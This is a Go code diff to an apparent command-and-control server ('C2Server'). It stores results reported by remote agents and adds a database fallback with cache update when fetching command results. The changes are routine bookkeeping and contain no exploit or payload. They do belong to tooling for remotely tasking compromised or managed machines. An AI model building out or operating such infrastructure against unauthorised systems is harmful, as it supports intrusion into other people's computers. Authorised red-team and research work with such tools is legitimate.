@@ -213,6 +213,16 @@ func (s *C2Server) SubmitResult(ctx context.Context, result *pb.TaskResult) (*pb
 		logrus.Errorf("Error: %s", result.Error)
 	}
 
+	// Store the result so GetCommandResult can retrieve it
+	// Format the payload as expected by parseAndStoreCommandResult: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
+	var payload string
+	if result.Success {
+		payload = fmt.Sprintf("%s|true|%s", result.TaskId, string(result.Output))
+	} else {
+		payload = fmt.Sprintf("%s|false|%s", result.TaskId, result.Error)
+	}
+	s.parseAndStoreCommandResult(payload)
+
 	return &pb.TaskAck{
 		Received: true,
 		Message:  "Result received",
@@ -810,6 +820,23 @@ func (s *C2Server) GetCommandResult(ctx context.Context, req *pb.CommandResultRe
 					break
 				}
 			}
+		}
+	}
+
+	// If still pending after timeout or not found in memory, check database as fallback
+	if !exists || result.Error == "Pending..." {
+		dbResult, err := s.db.GetCommandResult(req.CommandId)
+		if err == nil && dbResult != nil {
+			// Found in database, use it
+			result = dbResult
+			exists = true
+
+			// Also update in-memory cache for future requests
+			s.resultsMux.Lock()
+			s.commandResults[req.CommandId] = dbResult
+			s.resultsMux.Unlock()
+
+			logrus.Infof("Retrieved command result from database: %s", req.CommandId)
 		}
 	}
 
